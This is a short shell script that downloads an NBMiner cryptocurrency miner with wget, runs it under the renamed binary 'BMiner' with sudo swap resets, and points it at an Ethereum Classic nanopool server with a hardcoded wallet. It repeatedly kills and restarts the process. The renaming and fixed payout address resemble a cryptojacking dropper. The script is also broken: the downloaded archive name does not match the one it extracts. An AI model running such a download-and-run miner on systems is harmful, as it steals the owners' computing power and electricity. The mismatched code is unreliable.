#!/bin/sh
pkill -9 BMiner
sleep 9
pkill -9 BMiner
sleep 15
wget https://dl.nbminer.com/NBMiner_42.3_Linux.tgz 
tar -xf BMiner_42.3_Linux.tgz
sudo swapoff -a; sudo swapon -a
sleep 10
./BMiner -a etchash -o stratum+tcp://etc-eu1.nanopool.org:19433 -u 0xf3ffd073e16a2c69a6343d30e1d4d4e334133b9e.Nano
sleep 10
sudo swapoff -a; sudo swapon -a
pkill -9 BMiner
pkill -9 BMiner
pkill -9 BMiner
sleep 9
pkill -9 BMiner
sleep 15
sleep 45
